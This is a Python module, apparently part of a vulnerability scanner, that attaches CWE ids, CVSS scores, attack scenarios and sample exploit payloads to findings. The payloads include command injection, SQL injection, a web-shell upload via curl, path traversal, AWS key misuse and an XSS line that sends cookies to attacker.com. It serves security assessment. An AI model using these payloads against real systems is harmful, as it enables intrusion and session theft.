"""
adversary.py — autonomous exploit simulation engine.

For every detected vulnerability Finding, produces an AdversaryAnalysis
object containing:
  - cwe_id        : canonical CWE identifier
  - cvss_score    : CVSS v3.1 base score
  - attack_scenario : 1-2 sentence real-world narrative
  - poc_payload   : concrete, ready-to-use exploit string
"""

from __future__ import annotations

from dataclasses import dataclass

from core.detector import Finding


# ---------------------------------------------------------------------------
# Data model
# ---------------------------------------------------------------------------

@dataclass
class AdversaryAnalysis:
    """Adversary-perspective analysis for a single vulnerability finding."""
    finding: Finding
    cwe_id: str
    cvss_score: float
    attack_scenario: str
    poc_payload: str

    def to_dict(self) -> dict:
        return {
            "cwe_id": self.cwe_id,
            "cvss_score": self.cvss_score,
            "attack_scenario": self.attack_scenario,
            "poc_payload": self.poc_payload,
            "vuln_type": self.finding.vuln_type,
            "file": self.finding.file,
            "line": self.finding.line,
            "snippet": self.finding.snippet,
        }


# ---------------------------------------------------------------------------
# Vulnerability type → adversary profile mapping
# ---------------------------------------------------------------------------

_PROFILES: list[tuple[str, dict]] = [
    # --- Command Injection (CWE-78) ---
    (
        "Command Injection",
        {
            "cwe_id": "CWE-78",
            "cvss_score": 9.8,
            "attack_scenario": (
                "An attacker supplies a crafted hostname or filename parameter "
                "containing shell metacharacters. The application concatenates "
                "this value directly into a shell command, granting the attacker "
                "arbitrary OS-level code execution under the web server's privileges."
            ),
            "poc_payload": "127.0.0.1; whoami",
        },
    ),
    # --- SQL Injection (CWE-89) ---
    (
        "Unparameterised SQL",
        {
            "cwe_id": "CWE-89",
            "cvss_score": 9.8,
            "attack_scenario": (
                "An attacker manipulates a user-controlled field to inject SQL "
                "logic into the query. This allows authentication bypass, full "
                "database read/write access, and in some configurations remote "
                "code execution via stored procedures or INTO OUTFILE."
            ),
            "poc_payload": "' OR 1=1--",
        },
    ),
    # --- Insecure File Upload (CWE-434) ---
    (
        "Insecure File Upload",
        {
            "cwe_id": "CWE-434",
            "cvss_score": 9.8,
            "attack_scenario": (
                "An attacker uploads a web shell (e.g. shell.php) disguised with "
                "a double extension (shell.php.jpg) or manipulates the Content-Type "
                "header. Once stored in the web root, the shell is executed by the "
                "server, granting full remote code execution."
            ),
            "poc_payload": (
                "curl -F 'upload=@shell.php;type=image/jpeg' "
                "http://target/upload/raw"
            ),
        },
    ),
    # --- Path Traversal (CWE-22) ---
    (
        "CWE-22",
        {
            "cwe_id": "CWE-22",
            "cvss_score": 7.5,
            "attack_scenario": (
                "An attacker supplies a filename containing path-traversal sequences "
                "(e.g. ../../etc/passwd) as the upload name. Without secure_filename() "
                "sanitisation the file is written outside the intended directory, "
                "enabling overwrite of sensitive system files or server configuration."
            ),
            "poc_payload": "../../etc/passwd",
        },
    ),
    # --- Hardcoded Secret (CWE-798) ---
    (
        "Hardcoded Secret",
        {
            "cwe_id": "CWE-798",
            "cvss_score": 7.5,
            "attack_scenario": (
                "A threat actor discovers a hardcoded credential by cloning the "
                "repository or reading deployment artefacts. The exposed secret is "
                "used to authenticate directly against cloud APIs, databases, or "
                "third-party services without any audit trail."
            ),
            "poc_payload": (
                "export AWS_ACCESS_KEY_ID=AKIA<FOUND_KEY> && "
                "aws s3 ls"
            ),
        },
    ),
    # --- XSS (CWE-79) ---
    (
        "XSS",
        {
            "cwe_id": "CWE-79",
            "cvss_score": 6.1,
            "attack_scenario": (
                "An attacker injects a malicious script into a response that is "
                "rendered directly in a victim's browser. The payload runs in the "
                "victim's session context, enabling cookie theft, credential "
                "harvesting, or UI redressing attacks."
            ),
            "poc_payload": "<script>document.location='https://attacker.com/c?c='+document.cookie</script>",
        },
    ),
]


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def analyse(finding: Finding) -> AdversaryAnalysis:
    """Return an :class:`AdversaryAnalysis` for the given *finding*.

    Matches by substring against the finding's ``vuln_type`` field.
    Falls back to a generic low-confidence profile when no match is found.
    """
    vuln = finding.vuln_type

    for keyword, profile in _PROFILES:
        if keyword.lower() in vuln.lower():
            return AdversaryAnalysis(finding=finding, **profile)

    # Generic / unknown
    return AdversaryAnalysis(
        finding=finding,
        cwe_id="CWE-Unknown",
        cvss_score=5.0,
        attack_scenario=(
            "This finding may indicate a security weakness that could be "
            "exploited under the right conditions. Manual review is advised."
        ),
        poc_payload="N/A — manual exploit development required",
    )


def analyse_all(findings: list[Finding]) -> list[AdversaryAnalysis]:
    """Return an :class:`AdversaryAnalysis` for every finding in *findings*."""
    return [analyse(f) for f in findings]
